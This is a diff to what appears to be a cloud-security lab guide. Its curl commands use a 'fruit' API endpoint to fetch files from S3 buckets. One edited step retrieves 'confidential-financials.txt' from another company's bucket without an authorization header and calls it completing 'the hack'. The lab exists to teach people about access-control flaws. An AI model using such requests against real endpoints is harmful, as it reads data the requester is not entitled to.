@@ -192,7 +192,7 @@ Replace the placeholders with your values.
 * `<Fruit>`: Your assigned fruit.
 
 ```
-curl "https://<your_api_endpoint>/<StudentRole-Fruit_default>/fruit?bucket=your-bucket&file=fruitsalad.png" > fruitsalad.png
+curl "https://<your_api_endpoint>/StudentRole-<Fruit>_default/fruit?bucket=<your-bucket-name>&file=fruitsalad.png" > fruitsalad.png
 ```
 
 2. After running the command you should have a `fruitsalad.png` file in your directory.
@@ -248,7 +248,7 @@ aws s3 ls s3://company-legacy-data-425861498673/
 3. Replace placeholders with your values
 
 ```
-curl -H "Authorization: Bearer <your_app_token>" "https://<your_api_endpoint>/<StudentRole-Fruit_default>/fruit?bucket=company-legacy-data-425861498673&file=confidential-financials.txt" > financials.txt
+curl -v "https://<your_api_endpoint>/<StudentRole-Fruit_default>/fruit?bucket=company-legacy-data-425861498673&file=confidential-financials.txt" > financials.txt
 ```
 
 1. **View the Secret:** The command will print the contents of `confidential-financials.txt` directly to your terminal. Congratulations, you have completed the hack!
